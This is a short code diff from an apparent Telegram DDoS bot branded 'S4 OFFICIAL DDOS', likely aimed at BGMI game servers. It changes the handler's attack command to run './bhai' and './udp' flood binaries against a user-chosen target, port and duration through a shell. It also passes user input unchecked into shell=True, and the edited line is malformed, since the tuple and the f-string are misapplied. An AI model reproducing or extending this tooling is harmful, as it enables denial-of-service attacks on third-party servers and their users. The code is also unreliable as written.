@@ -308,7 +308,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/royal', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bhai {target} {port} {time} 12 1800", "./bhai {target} {port} {time} 12 1800", "./bhai {target} {port} {time} 12 1800"
+                full_command = f"./bhai {target} {port} {time} ", "./udp {target} {port} {time}",
                 process = subprocess.run(full_command, shell=True)
                 response = f"❌⚠️ ΔŦŦΔĆҜ ₣ƗŇƗŞĦ€Đ ⚠️❌\n\n𝐓𝐀𝐑𝐆𝐄𝐓 --> {target}\n𝐏𝐎𝐑𝐓 --> {port}\n𝐓𝐈𝐌𝐄 --> {time} 𝐒𝐄𝐂.\n\n🌹𝐒𝟒 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐃𝐃𝐎𝐒🌹"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
